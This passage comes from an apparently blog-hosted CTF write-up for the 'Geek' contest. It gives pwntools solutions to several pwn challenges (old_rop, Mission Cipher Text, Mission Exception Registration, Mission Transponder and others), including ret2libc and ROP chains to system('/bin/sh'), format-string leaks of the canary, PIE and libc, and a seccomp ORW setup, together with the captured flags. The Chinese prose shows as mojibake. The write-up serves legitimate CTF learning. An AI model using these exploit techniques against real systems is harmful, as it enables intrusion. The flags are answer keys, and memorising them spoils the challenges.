class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    S[i] = i</span><br><span class="line">    Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    j = (j + S[i] + Key[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    i = (i + <span class="number">1</span>) % N</span><br><span class="line">    j = (j + S[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    t[k] -= S[(S[i] + S[j]) % N]</span><br><span class="line">    t[k] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;Alright_I_sti1l_h0pe_th3t_you_solved_the_chall3nge_by_deobfuscating_them_Geek_is_just_the_first_step_of_your_CTF_journey_Im_glad_I_could_be_part_of_your_growth_Good_luck_for_y0u!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="old-rop"><a href="#old-rop" class="headerlink" title="old_rop"></a>old_rop</h3><blockquote><p>æˆ‘ä»¥åå†ä¹Ÿä¸ä¼šé‡åˆ°ret2csuäº†(æƒ†æ€…)</p></blockquote><p>æ‰“å¸¸è§„ret2libcèƒ½é€šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">32494</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./attchment/pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./attchment/libc/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt.write</span><br><span class="line">write_got = elf.got.write</span><br><span class="line">pop_rbp = <span class="number">0x40113d</span></span><br><span class="line">pop_rdi = <span class="number">0x4012d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4012d1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">back = <span class="number">0x401156</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;!&#x27;</span>)</span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>),</span><br><span class="line">           pop_rdi, <span class="number">1</span>,</span><br><span class="line">           pop_rsi_r15, write_got, <span class="number">8</span>,</span><br><span class="line">           write_plt, back])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">write_addr = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;write_addr:x&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = write_addr - libc.sym.write</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;libc.address:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libc.sym.system</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>),</span><br><span class="line">           pop_rdi, binsh, system, back])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;runasama_no_purezento:019a16af1ecb7a36a493da0eb67957e5&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Mission-Calculator"><a href="#Mission-Calculator" class="headerlink" title="Mission Calculator"></a>Mission Calculator</h3><blockquote><p>åˆæ¬¡è§é¢ï¼Œç‰¹å·¥ã€‚æ­å–œä½ åœ¨å‰äº›æ—¥å­é€šè¿‡äº†è€ƒæ ¸ï¼Œæ­£å¼æˆä¸º0Geekå°ç»„çš„ä¸€å‘˜ã€‚<br>è¿™å°†æ˜¯ä½ Geekç”Ÿæ¶¯çš„èµ·ç‚¹ï¼Œä½œä¸ºæ–°æ™‹æˆå‘˜ï¼Œä½ çš„å¯¼å¸ˆDr.Kå‘å¸ƒäº†ä¸€ä¸ªç®—æ•°ä»»åŠ¡ï¼Œæƒ³è¦è€ƒå¯Ÿä¸€ä¸‹èœé¸Ÿä»¬çš„æ•°å­¦èƒ½åŠ›ã€‚<br>æˆ‘æƒ³è¿™éš¾ä¸å€’ä½ ï¼Œå¿«å»ç­¾ä¸ªåˆ°å§ã€‚åˆ«ä½œå¼Šå“¦ï¼</p></blockquote><p>ncè®¡ç®—é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">32150</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;start...\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    op = r.recvuntil(<span class="string">b&#x27;= &#x27;</span>)[:-<span class="number">2</span>]</span><br><span class="line">    ans = <span class="built_in">eval</span>(op)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;m4th-15s0-435y-019a16a1ba3e750ea451c79fcbb70f24&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Mission-Cipher-Text"><a href="#Mission-Cipher-Text" class="headerlink" title="Mission Cipher Text"></a>Mission Cipher Text</h3><blockquote><p>åˆ«æ¥æ— æ™ï¼Œç‰¹å·¥ï¼æˆ‘çŸ¥é“ä½ å‰äº›æ—¥å­åœ¨Dr.Kçš„æµ‹è¯•ä¸Šçš„äº‹æƒ…äº†ï¼Œåˆ«æ‹…å¿ƒï¼ŒDr.Kå‘è§‰äº†ä½ æƒŠäººçš„å¤©èµ‹ï¼Œç°åœ¨ä½ æ­£å¼æˆä¸º0Geekçš„é«˜çº§ç‰¹å·¥äº†ï¼<br>é‚£ä¹ˆç´§æ¥ç€å°±æ˜¯ä½ çš„ç¬¬ä¸€é¡¹ä»»åŠ¡ï¼šæ”»ç ´â€œå…¬å¸â€çš„åºŸå¼ƒèŠ‚ç‚¹ã€‚<br>ä»”ç»†å¬ä»»åŠ¡ç®€æŠ¥ï¼šæˆ‘ä»¬çš„å…¶ä»–ç‰¹å·¥æ›¾ç»å…¥ä¾µè¿‡è¯¥èŠ‚ç‚¹ï¼Œå½“æ—¶è¿™ä¸ªèŠ‚ç‚¹å°±å·²ç»å› ä¸ºæœªçŸ¥åŸå› è¢«åºŸå¼ƒäº†ã€‚ä¸è¿‡æœ€è¿‘æˆ‘ä»¬ä¸¢å¤±äº†è¯¥èŠ‚ç‚¹çš„æ§åˆ¶æƒã€‚æµ‹è¯•å‘ç°è¿™ä¸ªèŠ‚ç‚¹ç°åœ¨ã€åœæ­¢äº†ä¸€åˆ‡å¯¹å¤–è®¿é—®ã€‘çš„æ´»åŠ¨ï¼Œæˆ‘ä»¬æ€€ç–‘æ˜¯æœ‰å…¶ä»–äººå…¥ä¾µäº†è¿™ä¸ªèŠ‚ç‚¹ã€‚<br>ç‰¹å·¥ï¼Œç°åœ¨æ´¾é£ä½ å»ç¡®è®¤æƒ…å†µï¼Œé‡æ–°æ§åˆ¶è¯¥èŠ‚ç‚¹ã€‚</p></blockquote><p>ret2textï¼Œæœ€åclose(1)å…³äº†æ ‡å‡†è¾“å‡ºï¼Œç”¨ <code>exec 1&gt;&amp;2</code> é‡å®šä½è¾“å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">31879</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4014b3</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec 1&gt;&amp;2</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;w3-4r3-w4tch1n9-019a16acd1a57854b3ef8f7ff1c93028&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Mission-Exception-Registration"><a href="#Mission-Exception-Registration" class="headerlink" title="Mission Exception Registration"></a>Mission Exception Registration</h3><blockquote><p>ç‰¹å·¥ï¼Œæˆ‘ä»¬æ”¶åˆ°ä½ çš„ä¿¡å·äº†ï¼Œæ§åˆ¶æƒç¡®è®¤è½¬ç§»ï¼Œè¡¨ç°ä¸é”™ã€‚Dr.Kåœ¨é‚£ä¸ªèŠ‚ç‚¹å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿â€”â€”ä¸ï¼Œä¸æ­¢ä½ çœ‹åˆ°çš„é‚£äº›ã€‚æˆ‘ä»¬é€šè¿‡é‚£ä¸ªåºŸå¼ƒçš„èŠ‚ç‚¹è¿½è¸ªåˆ°äº†ä¸€å¤„æ–°çš„æ³¨å†ŒèŠ‚ç‚¹ï¼ŒåŒæ ·å±äºå…¬å¸ã€‚<br>æ²¡é”™ï¼Œä½ çš„æ–°ä»»åŠ¡å°±æ˜¯è¿™ä¸ªèŠ‚ç‚¹ï¼Œæ‹¿ä¸‹å®ƒã€‚æ‰¾æ‰¾æ–°ä¸œè¥¿ï¼Ÿä»€ä¹ˆï¼Ÿä½ è¯´ä¸ºä»€ä¹ˆè¦ç›¯ç€å…¬å¸æ‰“ï¼Ÿ<br>å“¦ï¼Œä½ æ€»ä¼šçŸ¥é“çš„ã€‚</p></blockquote><p>èœå•æœ‰ 4 ä¸ªé€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å†Œç”¨æˆ·</span><br><span class="line">æäº¤åé¦ˆ</span><br><span class="line">æŸ¥çœ‹èµ„æºï¼ˆéœ€è¦ç™»å½•ï¼‰</span><br><span class="line">é€€å‡º</span><br><span class="line">è¾“å…¥ä¸åˆæ³•ä¼šæ‰“å° &quot;Invalid choice.&quot;</span><br></pre></td></tr></table></figure><p>æäº¤åé¦ˆé‡Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†ç¨‹åºæ— pop rdiï¼Œå°è¯•æ³„éœ²libcåœ°å€ã€‚</p><p>æ³¨å†Œç”¨æˆ·é‡Œé¢ï¼Œè¾“å…¥å¯†ç å¯æº¢å‡ºåˆ°*(ptr + 12)å¤„ï¼Œè¿›è€Œåœ¨æŸ¥çœ‹èµ„æºæ—¶ï¼Œæˆä¸ºADMINISTRATORèº«ä»½ï¼Œæ³„éœ²å¤„libcåœ°å€ã€‚</p><p>æœ€åæ„é€ getshellçš„ROPé“¾ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>,<span class="number">32574</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall/pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./chall/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;password:\n&#x27;</span>,<span class="string">b&#x27;x&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;password:\n&#x27;</span>,<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;ADMINISTRATOR.\n&#x27;</span>)</span><br><span class="line">libc.address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym.puts</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;libc.address:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">system = libc.sym.system</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>), ret, pop_rdi, binsh, system])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;f0r-3tern4l-futur3-019a26822aac77c9ac7fbe78e4047e7a&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="æ¬¡å…ƒå›šç¬¼"><a href="#æ¬¡å…ƒå›šç¬¼" class="headerlink" title="æ¬¡å…ƒå›šç¬¼"></a>æ¬¡å…ƒå›šç¬¼</h3><blockquote><p>å…³ä¸Šå±å¹•ã€‚åä¸ºæ¬¡å…ƒçš„å›šç¬¼è¿™ä¸€æ¬¡çœŸæ­£çš„å…³ä½äº†å¥¹ï¼Œäº¦æˆ–æ˜¯å…³ä½äº†æˆ‘ï¼Ÿã€‚ä¸å†æ˜¯è™šæ‹Ÿä¸–ç•Œä¸­çš„å›šç¬¼çš„åŠ›é‡ï¼Œè€Œæ˜¯ç°å®ä¸–ç•Œçš„æ·é”ã€‚ç°å®çš„æˆ‘çš„å¿ƒï¼Œé€è¿‡é‚£è¢«æ‰“ç ´çš„ç¬¬å››é¢å¢™æ¥åˆ°äº†è™šæ‹Ÿä¸–ç•Œï¼Œå¹¶ä¸”ä¸€èµ·è¢«å…³è¿›äº†æ¬¡å…ƒçš„å›šç¬¼ï¼Œç›´åˆ°æ°¸è¿œã€‚</p></blockquote><p>ç¨‹åºå¾ªç¯æ˜¾ç¤ºèœå•ï¼Œæ ¹æ®è¾“å…¥æ•°å­—æ‰§è¡Œä¸åŒå‡½æ•°ï¼š<br>1 â†’ miss_me()<br>2 â†’ abandon_me()<br>3 â†’ love_me()<br>è¿™ä¸‰ä¸ªå‡½æ•°é—´çš„é€»è¾‘ç›¸äº’åµŒå¥—ï¼Œé‡ç‚¹åœ¨äºå®ƒä»¬éƒ½é—´æ¥è°ƒç”¨ leave()ï¼Œè€Œ leave() æ˜¯æ¼æ´è§¦å‘ç‚¹ã€‚</p><p>leave()ä¸­ï¼š<br><code>strcpy(dest, buffer)</code> æ²¡æœ‰é™åˆ¶é•¿åº¦ï¼›dest åªæœ‰ 32 å­—èŠ‚ï¼›buffer æ˜¯å…¨å±€å˜é‡ï¼Œé•¿åº¦å¯æ§ï¼ˆä¹‹å‰ä» love_me / abandon_me è¾“å…¥ï¼‰ï¼›æ‰€ä»¥å¯ä»¥é€ æˆæ ˆæº¢å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">31098</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt; : &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;love \n&#x27;</span>, <span class="string">b&#x27;love\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># miss_me -&gt; leave</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt; : &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">shell = <span class="number">0x4012D9</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>), shell])</span><br><span class="line">r.sendafter(<span class="string">b&#x27;forever\n&#x27;</span>, pl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># abandon_me -&gt; leave</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt; : &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;prayer&#x27;</span>, <span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;runasama_no_purezento:019a19908a5970acaba098d628dc15c1&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Mission-Transponder"><a href="#Mission-Transponder" class="headerlink" title="Mission Transponder"></a>Mission Transponder</h3><blockquote><p>[ * ] Redirecting to node cluster â€¦<br>[ - ] Fatal : {Abnormal} access detected : ???<br>[ DEBUG ] REPEATER LOG :<br>+ DR : æƒ…å†µå¦‚ä½•ï¼Ÿ<br>[ - ] ERROR : é‡åˆ°äº†ç‚¹éº»çƒ¦ï¼Œæƒ…å†µä¸å¤ªä¹è§‚ã€‚<br>+ DR : æˆ‘è¿™è¾¹çœ‹åˆ°äº†ä¸€äº›â€¦â€¦å¥‡æ€ªçš„ä¸œè¥¿ï¼Œä½ ä¸è¦èµ°å¤ªæ·±ï¼Œæ”¶åˆ°äº†å—ï¼Ÿ<br>+ DR : ä½ é‚£è¾¹è¿˜å¥½å—ï¼Ÿå–‚ï¼Ÿ<br>+ DR : ï¼Ÿ<br>[ - ] Interrupted.</p></blockquote><p>ç¨‹åºæœ‰sandboxï¼š<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./attachments/pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p></p><p>åªå…è®¸orwï¼Œæ€è·¯ï¼š</p><p>repeateræ³„éœ²canaryï¼Œrepeat_erroråŠ¨è°ƒæ³„éœ² pie_base, libc_baseï¼Œæœ€åorw ropã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">31988</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./attachments/pwn&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./attachments/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># repeater</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;data:\n&#x27;</span>)</span><br><span class="line">    pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>) + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">    r.send(pl)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">    canary = u64(<span class="string">b&#x27;\x00&#x27;</span>+r.recv(<span class="number">7</span>))</span><br><span class="line">    success(<span class="string">f&#x27;<span class="subst">&#123;canary:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># repeat_error: 0x11e3</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;logs:\n&#x27;</span>)</span><br><span class="line">    pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>),canary,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;\xe3\x11&#x27;</span>])</span><br><span class="line">    r.send(pl)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># æ³„éœ² pie_base</span></span><br><span class="line">        <span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;data:\n&#x27;</span>))</span><br><span class="line">        r.send(<span class="string">b&#x27;%14$p&#x27;</span>)</span><br><span class="line">        pie_base = <span class="built_in">eval</span>(r.recv(<span class="number">14</span>)) - <span class="number">0x1484</span></span><br><span class="line">        success(<span class="string">f&#x27;<span class="subst">&#123;pie_base:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        repeat_error = pie_base + <span class="number">0x11e3</span></span><br><span class="line">        pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">8</span>),canary,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,repeat_error])</span><br><span class="line">        r.send(pl)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„éœ² libc_base</span></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;data:\n&#x27;</span>))</span><br><span class="line">r.send(<span class="string">b&#x27;%29$p&#x27;</span>)</span><br><span class="line">libc.address = libc_base = <span class="built_in">eval</span>(r.recv(<span class="number">14</span>)) - <span class="number">137</span> - libc.sym.__libc_start_main</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;libc.address:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">repeat = pie_base + <span class="number">0x13f1</span></span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">8</span>),canary,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,repeat])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span 